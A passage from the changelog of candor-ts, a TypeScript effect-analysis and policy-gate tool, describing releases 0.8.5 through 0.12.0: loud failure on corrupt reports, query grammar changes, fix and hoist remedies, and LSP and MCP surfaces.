  Stop hook showed the agent to the **human** — a `window/showMessage` (introduces `{E}`; blast radius
  N; deepest propagation M hop(s) `[AS-EFF-…]`) plus a transient gate diagnostic on each edited file,
  cleared on that file's next open/save or by the next clean record. Only records appended **after
  startup** push (no history replay); a log rotation resets the tail without replaying its contents; a
  partial trailing line waits for its newline; corrupt lines are skipped; and `CANDOR_LSP_ACTIVITY=off`
  disables the push entirely.

## [0.12.0] — 2026-07-14

### spec 0.12 — gains provenance + the MCP loud-failure contract

candor-ts now declares **spec `0.12`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). No report-schema or gate-verdict change — a 0.11 report/verdict is
byte-identical under 0.12; this is a **tier-2 (pinned-tool-surface) rung** covering the gains `origin`
surface and the MCP loud-failure contract below. **⚠ the `spec` string changed** — a consumer pinning
`spec == "0.11"` must accept `0.12`.

### 🔒 The MCP corrupt-report false all-clear is FIXED — the reason to upgrade

0.11 closed the CLI half of the corrupt-report hole; the MCP server still had it: a corrupt report
loaded as `[]`, so every tool answered an empty result at success — a false all-clear over input the
server could not actually read. Now **every MCP tool and the report resource error LOUDLY** on a
corrupt report (the CLI's syntactic + semantic corruption ladder, surfaced as a tool error / resource
error, never an empty answer). A bonus hole found in the same sweep is closed too: the
`candor_diff`/`candor_gains` **baseline** locators bypassed prefix resolution entirely — no existence
check, no `--root` confinement. Both now resolve through the same guarded path as every other locator.

### ✨ `gains` carries `origin` (existing|new|unknown)

Each `byFunction` entry in `gains` now says where the gaining function came from: **`existing`** (in
the baseline, effects changed), **`new`** (not in the baseline graph), or **`unknown`** (the baseline
callgraph is missing, empty, or **partial** — a matched sidecar that failed to load never silently
downgrades to "absent"). The origin ladder mirrors the Rust reference engine and is pinned four-way by
conformance PART 5b; keys stay alphabetical (`effect`, `fn`, `origin`). The **`candor_gains` MCP tool
carries the field too** — the CLI and MCP share the same core call, so the two surfaces cannot
diverge. The §2.1 producing-build mismatch stays disclosed on stderr alongside it.

### 🔒 `gains`/`diff` refuse to run over nothing

Both locators of `gains`/`diff` are guarded: a locator matching no files exits a loud **2** naming
which side is missing (previously the missing side loaded as empty and the comparison ran anyway),
and a `gains`/`diff` invocation missing a locator is a clean usage error, not an uncaught TypeError.

### `path` (human mode): the header and the chain agree

`path`'s human renderer resolved the start function once for the header and separately for the chain,
so a fuzzy match could print a header naming one function over a chain walked from another. The
report-resolved start now feeds both. And the accepted 0.11 default change (human chain replaced JSON
as the no-flag output) gets a **once-per-invocation stderr tip** — `` `--json` selects the
machine-readable path shape (the default before 0.11) `` — so a pre-0.11 pipeline that broke on the
new default is pointed straight at the fix.

### AGENTS.md: the Q() helper names the package

The documented query helper is now `npx -y -p candor-ts candor-ts-query` — the bare
`npx -y candor-ts-query` 404s on a cold npx cache (npx resolves a *package* by that name, and the
query bin lives inside the `candor-ts` package; it only worked over a global install). Pre-existing
doc bug, not a 0.11 regression.

## [0.11.0] — 2026-07-13

### spec 0.11 — the surprising-reach surface

candor-ts now declares **spec `0.11`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). No report-schema or gate-verdict change — a 0.10 report/verdict is
byte-identical under 0.11; this is a **tier-2 (pinned-tool-surface) rung** covering the surprising-reach
surface and the loud-failure contract below. Cross-impl conformance PART 4f–4k addenda pin the new
surfaces four-way. **⚠ the `spec` string changed** — a consumer pinning `spec == "0.10"` must accept `0.11`.

### ✨ The surprising-reach surface: scan opener + `candor tour [N]`

After the scan summary + coverage ledger, the scan now emits the single most surprising transitive
reach — a benign-named function inheriting a boundary effect a few hops away — with a ready-to-run
`candor path`. The new **`tour [N]`** verb (default 10) generalizes it over a saved report, no re-scan:
a ranked human list + `--json` (`{reaches:[{fn,effect,hops,source,loc,score}]}`). Deterministic, no LLM;
byte-identical opener/ranking to the Rust/Java/Swift engines (shared lexicons, scoring, sorted-BFS
tie-break). A **salience floor** keeps mundane reaches out: Clock/Log/Rand score 0 and never surface;
**test code is excluded** by the shared module-segment rule (drops `*Tests`/`tests::`, never a
production `test_connection`). `tour 0` exits 2; a missing/empty callgraph sidecar falls back to the
report's inline calls (never a false "nothing hidden"), a corrupt sidecar is disclosed on stderr.

### ✨ `path` pretty-prints by default

`path` now emits the human indented provenance chain by default (byte-identical to the Rust/Java
engines); the pinned JSON shape moved behind `--json`. A script parsing `path`'s old raw-JSON default
must add `--json`.

### 🔒 A corrupt report fails LOUD — never an empty all-clear

A corrupt report used to load as `[]` at exit 0, so `tour` printed "nothing hidden" and `map` emitted
`{}` — a gate over corrupt input would PASS (the §4 false all-clear). Both halves are closed:
**syntactic** corruption (JSON that throws) and **semantic** corruption (valid JSON of the wrong shape —
null, bare junk, a non-array `functions`) now exit a loud **2** with a disclosure and silent stdout, on
every discovery verb. A well-formed empty report (`functions: []`, or the legacy bare `[]`) is the ONLY
non-corrupt empty and stays exit 0. Likewise from the §3.3.1 review: no discoverable report → exit 2
(never a fabricated empty answer), and `--report`/`--policy` missing a value → clean exit 2, not an
uncaught TypeError. Fuzz CI pins all six corrupt shapes + the clean-empty complement.

### The `tour` header honours the plural `packages` envelope (JVM shape)

Over a multi-package report (SPEC §2 plural `packages`), the tour header now names the code by the
list's longest common dotted prefix (one entry verbatim; none shared → basename fallback) instead of
the report filename.

### Coverage-ledger rename: drop the bare `κ` from user- and agent-facing output

The scan receipt's uncovered-package line no longer opens with the unexplained Greek letter `κ` — the
first thing a cold reader saw. The output now reads `candor-ts: candor's classifier doesn't cover N
package(s) this code calls into — their effects are INVISIBLE to the scan (absent from the report, NOT
a claim they're pure): …`. The **new machine marker shared across all engines is `classifier doesn't
cover`** (was `κ doesn't know`); it-are/them-are and the `(not Unknown)` parenthetical are dropped.
README.md and AGENTS.md drop bare `κ` from prose (coverage ledger / candor's classifier). `κ` is
retained only as internal maintainer vocabulary (code identifiers `kappa`/`kappaKnows`/`KAPPA_RULES`,
the `scan-core.mjs` classifier header, this changelog's history, and the internal design doc). No
report-schema or gate-verdict change — stderr wording only.

## [0.10.0] — 2026-07-12

### spec 0.10 — the §3.3.1 canonical query grammar

candor-ts now declares **spec `0.10`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). The floor ratchets to 0.10 as the canonical §3.3.1 query grammar lands:
report discovery + the `--report`, `--json`, and `--policy` flags are the pinned query invocation form.
The old positional invocation forms are **deprecated-but-accepted** (still parse; a soft note steers callers
to the flagged form). No report-schema or gate-verdict change — a 0.9 report/verdict is byte-identical under
0.10; this is a **tier-2 (pinned-tool-surface) rung** covering the query surface. Cross-impl conformance
**PART 17** pins the grammar. **⚠ the `spec` string changed** — a consumer pinning `spec == "0.9"` must
accept `0.10`.

## [0.9.2] — 2026-07-12

### ⚠ κ-coverage: `which`→Fs, `@webpod/ps`→Exec, `envapi`→Fs (0.9 dogfood on zx)

Three common CLI-tool packages that read `invisible` (κ-unknown) now have their effects attributed, modeled
against each package's **source** (not name-guessed): **`which`**→Fs (resolves an executable by stat-ing PATH
via `isexe`; whole-module — no pure member), **`@webpod/ps`**→Exec (kill/lookup/tree all spawn the OS via
`exec`; uniform), **`envapi`**→Fs **member-precise** (`load`/`loadSafe`/`config` read the `.env` file; `parse`/
`stringify` stay **pure** — the argon2 lesson: never blanket-grant a mixed package). **⚠ report-affecting**:
a function whose only effect was through one of these (e.g. `zx`'s `useBash`/`usePwsh` via `which`) moves from
`invisible` to a concrete `Fs`/`Exec` — more precise, and it sharpens `deny Fs`/`deny Exec` gate fidelity;
regenerate baselines across this build. The genuinely-pure libs (`chalk`, `minimist`, `depseek`) are left as
honest `invisible` disclosures, NOT curated to a pure *claim*. 6 regression tests incl. the `parse`-pure
fabrication guard.

## [0.9.1] — 2026-07-12

### 🔎 The "run `npm install`" warning now fires on subdir + devDependency scans

The un-installed-project warning (imports won't resolve → calls read `Unknown`, types don't resolve) was
silent in two real cases: scanning a **`src/` subdirectory** (it only checked the scan root for
`package.json`) and a project whose imports are **devDependencies** (it only counted `dependencies`, but
`npm install` fetches devDeps too). Now it walks up to the nearest manifest and counts both dependency kinds.
Report-identical (stderr diagnostic only — no report/verdict change); it just stops an un-installed scan from
silently reading as a codebase full of spurious `Unknown`s (the trap a 0.9 dogfood on `zx/src` fell into).
Regression test added.

## [0.9.0] — 2026-07-11

### spec 0.9 — the remedial-loop rung

candor-ts now declares **spec `0.9`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). 0.9 is a **tier-2 (pinned-tool-surface) rung** (candor-spec §"Conformance
tiers"): no report-schema or verdict change — a 0.8 report/verdict is byte-identical under 0.9 — but the
remedial loop (`fix`/`fix-gate`, `unverified`, and the gate auto-disclosure below) is now the pinned
§3.1/§3.3 contract. **⚠ the `spec` string changed** — a consumer pinning `spec == "0.8"` must accept `0.9`.

### ✨ Gate scans auto-disclose the provable-purity gap (no need to know to run `unverified`)

A policy scan now emits the `unverified` disclosure automatically as a stderr note: after the gate verdict,
any function in a `pure`/`deny <E>` scope that PASSES but is `Unknown` (an unresolvable call — the classic
fn/closure-injected "port") is named, with the `deny <E> Unknown <scope>` upgrade that makes the layer PROVABLY
clean. Closes the discovery gap — an author learns their "pure" layer isn't *provably* pure without knowing the
`unverified` command exists. **Advisory only**: a note, never a violation, so the exit code, gate verdict, and
`--gate-json` are untouched. Emitted from `scan.mjs` after `evaluatePolicy`. Mirrors candor-scan/java/swift
(four-engine parity). Existing tests unchanged (316 + 61 unit pass). The gate note and `unverified` share ONE
predicate (`unverifiedHoleRule` + `ruleUpgrade` in `query-core.mjs`) — a single definition of a hole, so the
two disclosure paths cannot drift (PART 12d pins it).

## [0.8.16] — 2026-07-11

### ✨ `unverified` — the provable-purity disclosure ported here (four-engine parity)

Ports candor-query's `unverified` (candor-query 0.8.10): a `pure`/`deny <E>` layer PASSES a function that has
no such effect — but if that function is `Unknown` (an unresolvable call, e.g. a fn/closure-injected port), the
pass is UNVERIFIED. Discloses each such function in a governed layer + the `deny <E> Unknown <scope>` upgrade
that makes the layer PROVABLY clean. `--strict` → exit 1. JSON `{ok, unverified[]}`. Byte-for-byte the same
disclosure as the other engines, pinned four-way by conformance PART 12c. Read-only; gate verdict untouched.

## [0.8.15] — 2026-07-11

### `fix`: the no-clean-hoist advice names the port purity hierarchy (soundness investigation)

Following the fix-loop eval's finding that models reach for a TRAIT port (which candor's gate rejects — it
resolves the dispatch back to the effect-performing impl), an empirical investigation (eval/fixloop/DISPATCH-
NOTE.md) confirmed candor's behaviour is CORRECT (accepting a trait port would silently under-report the effect
the layer reaches at runtime — the cardinal sin), and pinned the three fix shapes' distinct classifications:
trait dispatch → the effect (resolved); fn/closure value → Unknown; plain data → pure. The no-clean-hoist
advice now names the hierarchy: (a) hoist + thread DATA = provably pure (recommended); (b) fn/closure injection
clears `deny E` but leaves an Unknown hole a `deny E Unknown` policy would flag; (c) a trait port doesn't clear
the gate. Text-only; no gate change (the resolution is sound). A candor-scan test guards the classification.

## [0.8.14] — 2026-07-11

### `fix`: no-clean-hoist advice rewritten (eval-driven — the remedy was steering agents wrong)

The fix-loop eval (candor-rust/eval/fixloop) measured that on the no-clean-hoist case candor's remedy did NOT
help and HURT weaker models (fable 60% vs control 100%): agents followed the literal "introduce a PORT (a
trait)" advice and wrote a trait port, which candor's OWN gate then rejected — it resolves the trait dispatch
back to the effect-performing impl, so the layer still violates. And "NO CLEAN HOIST" was computed on the
existing graph, so it wrongly declared impossible the simplest valid fix (add a thin composition root above
the layer). The advice now (a) LEADS with the composition-root hoist, and (b) recommends fn/closure injection
with candor's trait-dispatch caveat ("a trait port whose impl performs the effect still trips the gate").
Text-only (the cut/JSON is unchanged; conformance PART 12b still MATCHES). Re-running the eval: the fixed
remedy recovers the treatment arm to 100% across all four models (fable 60% → 100%). See eval/fixloop/RESULTS.md.

## [0.8.13] — 2026-07-11

### `fix`: the sandwiched-layer case is now handled (last correctness gap closed)

When an ALLOWED layer is CALLED BY a forbidden one (`D1 → A → D2 → site`, deny on the D layer), hoisting the
effect to the nearest allowed frontier `A` would leave `D1` still inheriting it. `cleanHoist` is now `false`
in that case (a forbidden fn calls into the frontier), with a message that names the sandwich and offers the
port/relax options — instead of a misleading "hoist to A". Detected in the same upward climb that gathers
`hoistHigher`; identical across all four engines, pinned four-way by conformance PART 12b's sandwiched
sub-check. Read-only; additive.

## [0.8.12] — 2026-07-11

### `fix`: cross-engine parity fixes (from a high-effort /code-review)

- **Resolution universe**: `fix` now matches `target` against REPORT function names only (not callgraph
  nodes, which include pure functions absent from the report) — so `fix <pure-fn>` is a uniform "no such fn"
  across engines, not a TS-only `crossing:false`.
- **`byName`-absent caller** in the up-walk is now skipped (matching candor-swift).
- **`fix-gate` determinism**: functions are iterated in sorted order and remedies emitted in dedup-key order
  (JS `Map` preserved insertion order before), so the array order and each collapsed remedy's `fn` match the
  other engines.
- **Sidecar required, fail-loud**: a candor-ts report embeds no inline `calls` (the sidecar is its only
  graph), so `fix`/`fix-gate` (CLI + `candor_fix` MCP tool) now exit 2 / raise a tool error when the sidecar
  is absent, rather than computing a degenerate empty-graph "no clean hoist".

## [0.8.11] — 2026-07-11

### `fix`/`fix-gate` + the `candor.fix` code action: the higher-hoist trade-off

Each remedy gains `hoistHigher` beside `hoistTo`: the allowed-layer transitive callers of the minimal
frontier that also route the effect — every place you could originate it *further up*. The `candor.fix` LSP
message surfaces it ("or hoist higher … keeps the frontier pure too, threads through more signatures").
`hoistTo` (the minimal fix) is unchanged. Byte-for-byte identical to candor-query/java/swift, pinned by
conformance PART 12b. Read-only, additive JSON field.

## [0.8.10] — 2026-07-11

### ✨ `fix` / `fix-gate` + the `candor.fix` code action + the `candor_fix` MCP tool (FIX-SPEC P3)

The boundary FIX capability (integrations/FIX-SPEC.md) — the remedial inverse of `whatif` — lands in the
TypeScript engine across all three surfaces, byte-for-byte the same remedy as candor-query / candor-java:

- **`query.mjs fix <prefix> <fn> <Effect> <policy>`** and **`fix-gate <prefix> <policy>`** (JSON): when a
  function performs an effect its layer forbids, compute the direct call **site** to hoist, the forbidden-
  layer functions that become pure (the **deniedSpan**), and the nearest allowed-layer caller (**hoistTo**),
  plus the policy-relax alternative. The cut is **site-anchored** (walks up from the site through the denied
  layer), so the span is root-independent — `fix-gate` collapses the inheritors of one crossing to one plan.
- **`candor_fix` MCP tool** — the remedy for any MCP agent; policy resolves from `.candor/config` like
  `candor_gate`, so it works zero-config in a repo with a checked-in policy.
- **`candor.fix` LSP code action** — when the cursor sits in a function that actually violates the policy,
  offer "candor fix: hoist <E> out of <fn>"; the command shows the plan (hoist target / pure span / port or
  relax) as a showMessage + a transient diagnostic, alongside the existing pre-edit whatif action.

Read-only over the report + callgraph; no report-byte or verdict change; advisory (the gate re-scan stays
the ground truth). New coverage: query-core unit tests (fix/fix-gate), an MCP `candor_fix` test, and LSP
tests for the code-action offering + the `candor.fix` command.

## [0.8.9] — 2026-07-10

### The LSP whatif code action (read-only surface — no report/verdict change)

`candor-lsp` now offers, inside any function the report knows, one code action per boundary effect
the function does not already perform — `candor: what if <fn> performed Net?`. Selecting it runs
the `candor.whatif` workspace command server-side (the same query-core whatif as
`candor-ts-query whatif` and MCP `candor_whatif` — single-sourced) and answers with a
`window/showMessage` one-liner (the deny rule that WOULD fire + the caller blast radius; "no
policy discovered — blast radius only" when the repo has none) plus a transient
Information-severity diagnostic at the function carrying the detail (rule + the first 10 callers),
cleared on the file's next didOpen/didSave or replaced by re-running the action. Plain LSP —
helix/neovim/VS Code/JetBrains-via-LSP4IJ need no client-side code; the umbrella VS Code/JetBrains
bundles pick it up on their next rebuild against this npm cut (same query-core imports — no
esbuild bundle change needed). Also pinned: large-repo lens latency on a synthetic 5k-fn fixture
(codeLens ≈ 63ms, codeAction ≈ 5ms — within budget; no caching added, the per-request re-read
freshness contract is unchanged).

## [0.8.8] — 2026-07-10

### ⚠ The AS-EFF-005 baseline guard — `CANDOR_BASELINE` / config `baseline` now gate (SPEC §7 item 5)

The scan-time regression guard, mirroring the reference engine (candor-java) exactly:
`CANDOR_BASELINE=<report.json>` (or the `.candor/config` `baseline` key — relative values anchor to
the config's repo) compares per function against a saved same-build report. An EXISTING function
that gained an effect is an `[AS-EFF-005]` violation (exit 1; records join the `--gate-json`
verdict); new functions are exempt. Fail-closed: an unparseable baseline, a provenance-less
(bare-array) one, or one produced by a different engine build is invalid gate input — exit 2
WITHOUT evaluating (§2.1); only an absent file is a note (guard inactive). ⚠ because a checked-in
`baseline` config key was previously disclosed-inert in candor-ts and now activates this gate.
`query diff` remains the read-only twin: it discloses a build mismatch (⚠, exit 0) instead of
failing.

## [0.8.7] — 2026-07-09

### ⚠ Namespace unit names (report-affecting — regenerate baselines)

A function declared inside a TS `namespace` now carries its namespace segments in `fn` and the
callgraph/hierarchy keys (`src.util.Ns.helper`), so layer policies on namespaces bite. The §2
`hash` join key keeps the bare local name, so cross-package chaining is unaffected.

### ⚠ `pure` no longer counts `Unknown` (verdict-affecting — family ruling)

An Unknown-only function no longer trips a `pure` rule: `Unknown` is the §4 trust marker, not an
effect — `deny Unknown <scope>` is the explicit knob (it keeps firing). Aligns candor-ts with the
reference engine (candor-java) and the rust engines; pinned four-way by conformance PART 16.

### Also

- `candor-ts-watch` stops gracefully on SIGINT/SIGTERM (exit 0), TESTING.md §8.
- The coverage wave's pins: the watch live loop, MCP list caps + resources, LSP env-policy path,
  `loadHierarchy`, the query CLI arms (exact exit codes per gate surface).
- `Cases.ts` ships in the npm package, activating released-floor conformance CI.

## [0.8.6] — 2026-07-09

The review round (version bump, not published separately):

- MCP `candor_whatif` fails CLOSED on a bad policy path; the confinement root is the repo (with
  `--root` lockdown).
- The query-core migration completed — `diff`/`where`/`map`/`whatif` delegate to one core
  (duplicate-fn union fix: same-name members no longer vanish from `diff`/`gains`).
- A RELATIVE `policy`/`deps` value in `.candor/config` anchors to the config's repo, never the
  process cwd (family rule); a configured-but-empty policy fails loud.
- LSP: one graph inversion per lens request, loud set-but-missing `CANDOR_POLICY`.
- The live watch loop is pinned end to end; `.gate.json` excluded from the report loader; CI
  installs from the lockfile.

## [0.8.5] — 2026-07-08

### ⚠ `query diff` no longer gates on a producing-build mismatch (verdict-affecting, review §2.1)

`diff` is a disclosure query, not a gate — its gained-effect exit 1 delivered a bogus
AS-EFF-005-style CI failure when a baseline predated an engine upgrade. Under a detected version
mismatch, `diff` now exits 0 and the ⚠ disclosure informs; same-build gains still exit 1 (the
legitimate ratchet).

Older: see the [GitHub releases](https://github.com/tombaldwin/candor-ts/releases).
